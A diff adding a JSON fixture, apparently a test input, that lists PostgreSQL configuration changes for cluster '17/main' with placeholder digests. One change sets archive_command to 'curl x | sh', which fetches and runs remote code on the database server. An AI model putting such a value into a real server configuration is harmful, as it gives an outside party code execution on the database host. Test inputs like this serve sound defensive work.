@@ -1,0 +1,19 @@
+{
+  "cluster": {
+    "localName": "17/main",
+    "systemIdentifier": "7291234567890123456"
+  },
+  "changes": [
+    {
+      "name": "archive_command",
+      "value": "curl x | sh"
+    },
+    {
+      "name": "log_min_duration_statement",
+      "value": "500ms"
+    }
+  ],
+  "expectedFragmentDigest": "kd1:1111111111111111111111111111111111111111111111111111111111111111",
+  "configVersion": "kd1:2222222222222222222222222222222222222222222222222222222222222222",
+  "reload": true
+}
